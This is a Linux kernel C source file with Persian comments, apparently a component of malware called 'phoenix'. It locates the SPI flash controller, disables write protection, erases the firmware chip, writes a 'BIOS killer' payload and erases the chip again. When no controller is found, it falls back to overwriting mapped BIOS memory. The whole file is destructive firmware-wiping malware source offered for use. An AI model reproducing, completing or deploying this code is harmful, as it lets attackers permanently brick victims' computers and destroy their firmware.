#include <linux/pci.h>
#include <linux/ioport.h>
#include <linux/io.h>
#include <linux/delay.h>
#include "spi_flash.h"
#include "phoenix_defs.h"

// شناسایی کنترلر SPI
static struct pci_dev *find_spi_controller(void) {
    struct pci_dev *pci_dev = NULL;
    const u16 vendor_ids[] = {0x8086, 0x1022, 0x10EC, 0x1B85}; // Intel, AMD, Realtek, Marvell
    const u16 device_ids[] = {0x1f48, 0x790b, 0x5229, 0x1f50};
    
    for (int i = 0; i < ARRAY_SIZE(vendor_ids); i++) {
        pci_dev = pci_get_device(vendor_ids[i], device_ids[i], NULL);
        if (pci_dev) return pci_dev;
    }
    return NULL;
}

// پاک‌سازی کامل چیپ SPI
static void spi_chip_erase(void __iomem *spi_base) {
    // فعال‌سازی نوشتن
    writeb(SPI_CMD_WREN, spi_base + SPI_OPCODE);
    udelay(100);
    
    // ارسال دستور پاک‌سازی کامل
    writeb(SPI_CMD_CHIP_ERASE, spi_base + SPI_OPCODE);
    
    // انتظار برای تکمیل عملیات
    int timeout = 300; // 30 ثانیه
    while (timeout--) {
        if (readb(spi_base + SPI_STATUS) & SPI_STATUS_READY) break;
        msleep(100);
    }
}

// نوشتن پیلود تخریب‌گر
static void flash_destruct_payload(void __iomem *spi_base) {
    const u8 *payload = get_bios_killer_payload();
    for (int i = 0; i < BIOS_KILLER_SIZE; i += SPI_PAGE_SIZE) {
        // فعال‌سازی نوشتن
        writeb(SPI_CMD_WREN, spi_base + SPI_OPCODE);
        udelay(100);
        
        // ارسال دستور برنامه‌ریزی صفحه
        writeb(SPI_CMD_PAGE_PROGRAM, spi_base + SPI_OPCODE);
        writew(i >> 8, spi_base + SPI_ADDRESS_HIGH);
        writew(i & 0xFF, spi_base + SPI_ADDRESS_LOW);
        
        // نوشتن داده‌های مخرب
        for (int j = 0; j < SPI_PAGE_SIZE; j++) {
            writeb(payload[i + j], spi_base + SPI_DATA);
        }
        
        // انتظار برای تکمیل نوشتن
        int timeout = 10;
        while (timeout--) {
            if (readb(spi_base + SPI_STATUS) & SPI_STATUS_READY) break;
            udelay(100);
        }
    }
}

// تخریب اصلی فرم‌ور
void destroy_firmware(void) {
    struct pci_dev *spi_dev = find_spi_controller();
    if (!spi_dev) goto fallback;
    
    // فعال‌سازی منطقه حافظه
    if (pci_request_region(spi_dev, 0, "phoenix_spi") != 0) {
        pci_dev_put(spi_dev);
        goto fallback;
    }
    
    void __iomem *spi_base = pci_iomap(spi_dev, 0, 0);
    if (!spi_base) {
        pci_release_region(spi_dev, 0);
        pci_dev_put(spi_dev);
        goto fallback;
    }
    
    // غیرفعال‌سازی حفاظت نوشتن
    writeb(0x06, spi_base + SPI_OPCODE); // WREN
    writeb(0x01, spi_base + SPI_CONTROL); // Disable protection
    writeb(0x00, spi_base + SPI_LOCK);    // Unlock sectors
    
    // انجام عملیات تخریب
    spi_chip_erase(spi_base);
    flash_destruct_payload(spi_base);
    
    // تخریب ثانویه برای اطمینان
    spi_chip_erase(spi_base);
    
    // رهاسازی منابع
    pci_iounmap(spi_dev, spi_base);
    pci_release_region(spi_dev, 0);
    pci_dev_put(spi_dev);
    return;

fallback:
    // روش جایگزین: نوشتن مستقیم بر روی حافظه
    void __iomem *bios_mem = ioremap(BIOS_MEM_BASE, BIOS_MEM_SIZE);
    if (bios_mem) {
        for (int i = 0; i < BIOS_MEM_SIZE; i++) {
            writeb(0xFF, bios_mem + i);
        }
        iounmap(bios_mem);
    }
}
